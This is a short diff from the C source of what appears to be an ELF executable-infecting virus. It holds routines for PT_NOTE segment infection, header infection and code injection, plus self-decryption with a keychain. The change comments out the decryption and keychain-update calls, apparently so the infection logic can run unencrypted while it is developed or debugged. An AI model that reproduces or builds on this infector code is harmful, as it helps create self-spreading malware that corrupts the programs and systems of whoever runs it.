@@ -52,7 +52,7 @@ __attribute__((always_inline)) static inline void update_note_segment(struct s_n
 
 void note_infection(struct s_host *host, struct s_keychain *keychain)
 {
-	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+//	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
 	
 	struct s_note note = {0};
 	Elf64_Phdr *segment = NULL;
@@ -74,8 +74,8 @@ void note_infection(struct s_host *host, struct s_keychain *keychain)
 	update_note_segment(&note);
 	host->note = &note;
 
-	update_keychain_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
-	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+//	update_keychain_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
+//	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
 	header_infection(host, keychain);
 
